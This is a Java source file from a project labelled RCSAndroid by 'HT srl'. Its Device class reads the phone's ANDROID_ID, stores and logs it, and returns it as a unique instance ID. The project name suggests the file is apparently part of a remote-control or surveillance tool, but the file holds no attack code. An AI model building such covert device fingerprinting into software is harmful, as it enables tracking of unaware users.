/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 06-dec-2010
 **********************************************/
package com.ht.RCSAndroidGUI;

import android.content.ContentResolver;
import android.provider.Settings.Secure;
import android.util.Log;

public class Device extends Keys {
	private ContentResolver contentResolver;
	private String androidId;
	
	public Device(ContentResolver cr) throws RCSException {
		if (cr == null) {
			throw new RCSException("ContentResolver Invalid");
		}
		
		this.contentResolver = cr;
	}
	
	public void init() throws RCSException {
		this.androidId = Secure.getString(this.contentResolver, Secure.ANDROID_ID);
		
		for (int i = 0; i < this.g_InstanceId.length; i++) {
			this.g_InstanceId[i] = 0;
		}
		
		if (this.androidId.length() > this.g_InstanceId.length) {
			throw new RCSException("Android ID too long");
		}

		System.arraycopy(this.androidId.getBytes(), 0, this.g_InstanceId, 0, this.androidId.getBytes().length);
		
		Log.d("Que", "Device Unique ID: " + androidId);
	}
	
	public byte[] getUniqueId() throws RCSException {
		if (this.androidId.length() == 0) {
			throw new RCSException("Object not yet initialized");
		}
		
		byte[] uniqueId = new byte[this.androidId.length()];
		
		System.arraycopy(this.g_InstanceId, 0, uniqueId, 0, uniqueId.length);
		
		return uniqueId;
	}
}
